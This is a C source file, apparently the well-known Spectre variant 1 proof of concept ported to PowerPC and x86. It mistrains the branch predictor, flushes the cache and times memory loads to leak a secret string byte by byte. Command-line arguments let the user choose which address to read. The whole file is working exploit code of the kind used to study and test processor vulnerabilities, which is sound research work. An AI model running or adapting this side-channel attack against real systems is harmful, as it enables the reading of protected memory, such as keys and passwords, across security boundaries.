#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>

#include "spectre_archs.h"
#include "spectre_intrinsics.h"
#include "timer.h"

#define RESET       "\033[0m"
#define BOLD        "\033[1m"         /* Bold font */
#define RED         "\033[31m"        /* Red font */
#define GREEN       "\033[32m"        /* Green font */
#define BOLDRED     "\033[1m\033[31m" /* Bold Red font */
#define BOLDGREEN   "\033[1m\033[32m" /* Bold Green font */

#if defined(__ARCH_POWERPC__)
#define CACHE_HIT_THRESHOLD 1
#else
#define CACHE_HIT_THRESHOLD 80
#endif

/********************************************************************
 * Victim code.
 ********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
uint8_t unused2[64];
uint8_t array2[(256 * 512)];

const char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0xff; /* Used so compiler won’t optimize out victim_function() */

void __attribute__ ((noinline)) victim_function(size_t x) {
	if (x < array1_size) {
		temp &= array2[(array1[x] * 512)];
	}
}

/********************************************************************
 * Analysis code
 ********************************************************************/

/* Report best guess in value[0] and runner-up in value[1] */
void read_memory_byte(size_t malicious_x, uint8_t value[2], int score[2]) {
	int tries, i, j, k, mix_i, results[256] = { 0 };
	unsigned int junk = 0;
	size_t training_x, x;
	register uint64_t time1, time2;
	volatile uint8_t *addr;

	for (tries = 999; tries > 0; tries--) {
		/* Flush array2[256*(0..255)] from cache */
		for (i = 0; i < 256; i++) {
#if defined(__ARCH_POWERPC__)
			__dcbf(array2, (i * 512));
#elif defined(__ARCH_X86__)
			_mm_clflush(&array2[i * 512]); /* intrinsic for clflush instruction */
#else
#error No cache flush implementation exists for your architecture!
#endif
		}

		/* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
		training_x = (tries % array1_size);
		for (j = 29; j >= 0; j--) {
			volatile int z;

#if defined(__ARCH_POWERPC__)
			__dcbf(&array1_size, 0);
#elif defined(__ARCH_X86__)
			_mm_clflush(&array1_size);
#else
#error No cache flush implementation exists for your architecture!
#endif

			for (z = 0; z < 100; z++); /* Delay (can also mfence) */

			/* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
			/* Avoid jumps in case those tip off the branch predictor */
			x = (((j % 6) - 1) & ~0xFFFF); /* Set x=FFF.FF0000 if j%6==0, else x=0 */
			x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
			x = (training_x ^ (x & (malicious_x ^ training_x)));

			/* Call the victim! */
			victim_function(x);
		}

		/* Time reads. Order is lightly mixed up to prevent stride prediction */
		for (i = 0; i < 256; i++) {
			mix_i = (((i * 167) + 13) & 255);
			addr = &array2[mix_i * 512];

			time1 = __gettime();

			junk = *addr; /* memory access to time */

			/* read timer & compute elapsed time */
			time2 = __gettime();
			time2 -= time1;

			if (time2 <= CACHE_HIT_THRESHOLD
				&& mix_i != array1[tries % array1_size]) {
				/* cache hit - add +1 to score for this value */
				results[mix_i]++;
			}
		}

		/* Locate highest & second-highest results results tallies in j/k */
		j = k = -1;
		for (i = 0; i < 256; i++) {
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
			} else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}

		if (results[j] >= (2 * results[k] + 5)
			|| (results[j] == 2 && results[k] == 0)) {
			break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
		}
	}

	results[0] ^= junk; /* use junk so code above won’t get optimized out*/
	value[0] = (uint8_t)j;
	score[0] = results[j];
	value[1] = (uint8_t)k;
	score[1] = results[k];
}

int main(int argc, const char **argv) {
	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
	int i, score[2], len = 40;
	uint8_t value[2];
	char * recovered_string;

	for (i = 0; i < sizeof(array2); i++) {
		/* write to array2 so in RAM not copy-on-write zero pages */
		array2[i] = 1;
	}

	if (argc == 3) {
		sscanf(argv[1], "%p", (void **)(&malicious_x));
		malicious_x -= (size_t)array1; /* Convert input value into a pointer */
		sscanf(argv[2], "%d", &len);
	}

	recovered_string = calloc(1, (len + 1));

	if (recovered_string == NULL) { return EXIT_FAILURE; }

	printf("array1 = %p secret = %p\n", array1, secret);

	printf("Reading %d bytes:\n", len);
	for (i = 0; i < len; i++) {
		printf("Reading at malicious_x = %p... ", (void *)malicious_x);

		read_memory_byte(malicious_x++, value, score);

		printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
		printf("0x%02X = ’%c’ score = %d ", value[0],
			   (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
		if (score[1] > 0) {
			printf("(second best: 0x%02X score = %d)", value[1], score[1]);
		}
		printf("\n");

		recovered_string[i] = (value[0] > 31 && value[0] < 127 ? value[0] : '?');
	}

	printf("String: '" BOLD "%s" RESET "'\n", recovered_string);
	printf("temp = 0x%02x\n", temp);

	return EXIT_SUCCESS;
}
